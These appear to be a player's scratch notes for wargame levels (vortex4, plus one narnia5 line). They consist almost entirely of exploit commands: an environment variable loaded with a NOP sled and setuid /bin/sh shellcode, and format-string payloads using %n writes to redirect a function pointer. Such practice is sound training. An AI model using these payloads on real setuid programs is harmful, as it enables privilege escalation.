/vortex/vortex4

mkdir /tmp/ballban_vortex4
cd /tmp/ballban_vortex4

nano vortex4_execv.c
gcc -m32 -o vortex4_execv vortex4_execv.c

# Create check_env.c and compile it
# It will check the address of environment variables
nano check_env.c
gcc -m32 check_env.c -o check_env


# Get EGG's address
./check_env EGG

# Set random environment variables to address of EGG
unset $(env | cut -d= -f1)  # cleanup envs
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
export EGG=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 1000 + b'\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80')")
for i in {A..Z}; do
    export $i=$(python3 -c "import sys; sys.stdout.buffer.write(b'%p.%p.' * 100)")
done
export SHELL=/bin/bash
export LANG=C.UTF-8
export LC_CTYPE=UTF-8
export LC_TYPE=en_US.UTF-8
export LC_ALL=en_US.UTF-8
_=/usr/bin/env
env
gef ./vortex4_execv

# Run the program
./vortex4_execv

./narnia5 $(python3 -c "import sys; sys.stdout.buffer.write(b'\xb0\xd3\xff\xff\xb0\xd3\xff\xff%492u%n')")

# run the program get address of hackedfunction and ptrf
# hackedfunction is at 0x804930f -> 134517519
# ptrf is at 0xffffd308
# let ptrf point to hackedfunction
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffd308) + b'%134517515u%n')")
# change the address and run again
# ptrf is at 0xffffd2f8
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffd2f8) + b'%134517515u%n')")
quit